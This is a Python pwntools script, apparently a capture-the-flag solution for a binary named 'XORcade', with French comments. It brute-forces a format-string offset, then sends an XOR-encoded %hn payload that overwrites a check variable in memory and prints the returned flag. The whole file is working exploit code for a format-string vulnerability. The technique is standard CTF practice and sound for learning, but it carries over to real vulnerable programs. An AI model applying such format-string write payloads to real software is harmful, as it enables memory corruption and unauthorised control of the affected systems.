from pwn import process, p32

KEY = [0xDE, 0xAD, 0xBE, 0xEF]


def xor(data, key):
    return bytes([b ^ key[i % 4] for i, b in enumerate(data)])


def find_offset(binary_path: str) -> int | None:
    for i in range(100):
        io = process(binary_path)
        # Formatte et XOR le payload
        payload = b"AAAB%" + str(i).encode() + b"$x"
        xor_payload = xor(payload, KEY)
        io.sendline(xor_payload)
        # Lis la sortie du binaire
        if b"414141" in io.recvall():
            return i  # Offset trouvé

    raise ValueError("Offset non trouvé.")


def string_format_bug(binary_path: str, offset: int, value: int) -> str:
    io = process(binary_path)
    # Lis l'adresse de la variable
    io.recvuntil(b"check_var addr: ")
    target = int(io.recvline().strip(), 16)

    # On sépare l'addresse en deux parties
    first = value >> 16
    second = value & 0xFFFF
    # Format string
    if first < second:
        fmt = f"%{first - 8}c%{offset}$hn%{second - first}c%{offset + 1}$hn"
        payload = p32(target + 2) + p32(target) + fmt.encode()
    else:
        fmt = f"%{second - 8}c%{offset}$hn%{first - second}c%{offset + 1}$hn"
        payload = p32(target) + p32(target + 2) + fmt.encode()

    xor_payload = xor(payload, KEY)
    # On envoie le payload au binaire
    io.sendline(xor_payload)
    io.recvuntil(b"Flag:")
    # Lis la ligne retournée par le binaire
    flag = io.recvline().decode().strip()
    return flag


if __name__ == "__main__":
    binary_path = "./XORcade"
    offset = find_offset(binary_path)
    flag = string_format_bug(binary_path, offset, value=0x3C548A98)
    print(f"Flag: {flag}")
